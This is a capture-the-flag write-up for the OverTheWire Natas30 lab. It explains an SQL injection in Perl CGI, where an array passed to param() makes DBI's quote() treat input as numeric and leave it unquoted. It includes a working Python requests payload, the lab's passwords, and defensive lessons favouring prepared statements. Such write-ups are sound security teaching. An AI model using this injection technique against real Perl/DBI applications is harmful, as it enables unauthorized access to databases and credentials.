---
category: natas
title: Natas30 - SQL Injection in Perl CGI
---

website: http://natas30.natas.labs.overthewire.org/ (password: wie9iexae0Daihohv8vuu3cei9wahf0e)

This challenge is all about SQL injection and improper use of Perl CGI functions.
In the challenge, a user's inputs are handled by `$dbh->quote(param(...))`. 
See the source code below:

```perl
my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password')); 

my $sth = $dbh->prepare($query);
$sth->execute();
```

On the one hand, the `param()` function in CGI.pm is context sensitive: 
If a parameter is a single value (e.g., an integer or a string), `param()` returns that value.
If the parameter is an array, then the function will return an array reference.
That means, `$dbh->quote()` may receive an array from the `param()` if we pass in an array as a parameter.

On the other hand, according to 
<a href="https://metacpan.org/pod/release/TIMB/DBI-1.637/DBI.pm#quote">this document</a>, 
`quote()` can take a second parameter `$data_type`:
	"If `$data_type` is supplied, it is used to try to determine the required quoting behaviour by using the information returned by 
		<a href="https://metacpan.org/pod/release/TIMB/DBI-1.637/DBI.pm#type_info">type_info</a>. 
		As a special case, the standard numeric types are optimized to return `$value` without calling `type_info`".
What does this mean? In my own words, 
it means that the `quote()` function <em>cannot</em> garantee a parameter is always quoted.
It all depends on the second parameter `$data_type`, if it exists.
If that parameter exists and specifies a NUMERIC type, then the value (i.e., the first parameter) won't be quoted.
In this case, it makes SQL injection possible.

With the above information in mind, we can draft a payload below to make the CGI malfunction:

```python
#!/usr/bin/env python3
import requests
 
payload = {"username": "natas31", "password": ["'a' or 1", 2]}
 
url = 'http://natas30.natas.labs.overthewire.org/index.pl'
auth = ('natas30', 'wie9iexae0Daihohv8vuu3cei9wahf0e')
resp = requests.post(url, auth=auth, data=payload)
print(resp.text)
```

As shown above, in the payload, I have assigned an array to the `password`.
Moreover, the second value of `password` is 2, 
which makes the Perl `quote()` consider it's taking a NUMERIC value.
As such, the first value (i.e., the string <small>\'a\' or 1</small>) will not be quoted any more.
This makes the final query string look like:

```plain
SELECT * FROM users WHERE username = 'natas31' AND password = 'a' OR 1
```

Running the above script returns natas31's password:
<small>hay7aecuungiuKaezuathuk9biin0pu1</small>.

<strong>LESSONS LEARNED</strong>

1. Although `quote()` is safe when used properly, 
prepared statements are better, safer, and harder to use wrong. 
Use prepared statements in DBI whenever possible to avoid SQL injection.
2. Don't use CGI's `param()` in argument lists, hash constructors, 
or any other place where it could return an unexpected number of items.
Either put scalar out front, assign to a scalar, or assign to an array. 
Or, better yet, avoid CGI.pm and workalike interfaces entirely.
